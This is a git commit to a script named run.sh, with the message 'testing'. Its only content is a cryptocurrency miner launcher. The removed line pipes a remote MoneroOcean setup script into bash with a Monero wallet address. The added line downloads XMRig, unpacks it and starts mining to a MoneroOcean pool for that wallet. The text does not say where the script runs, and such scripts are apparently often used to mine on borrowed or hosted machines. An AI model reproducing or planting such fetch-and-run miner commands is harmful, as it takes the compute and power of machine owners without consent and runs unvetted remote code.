55641ccb8b633882eba05b8b50e5771316b13ea5
skyisntwhite <150611141+skyisntwhite@users.noreply.github.com>
2024-08-21 11:39:23 +0700

    Update run.sh
    testing

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 42or42u7B5q44jaQYS2M4Jd3Fd96pSanpJA2GvQNbNq1T6hah6RbnKLDcxZpUaT8eT9XckovdZrLjFA3PLvoKij5P9acxwr
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz && tar -xf xmrig-6.22.0-linux-static-x64.tar.gz && cd xmrig-6.22.0 && ./xmrig -o gulf.moneroocean.stream:443 -u 42or42u7B5q44jaQYS2M4Jd3Fd96pSanpJA2GvQNbNq1T6hah6RbnKLDcxZpUaT8eT9XckovdZrLjFA3PLvoKij5P9acxwr+128000 -k --tls -p uwu
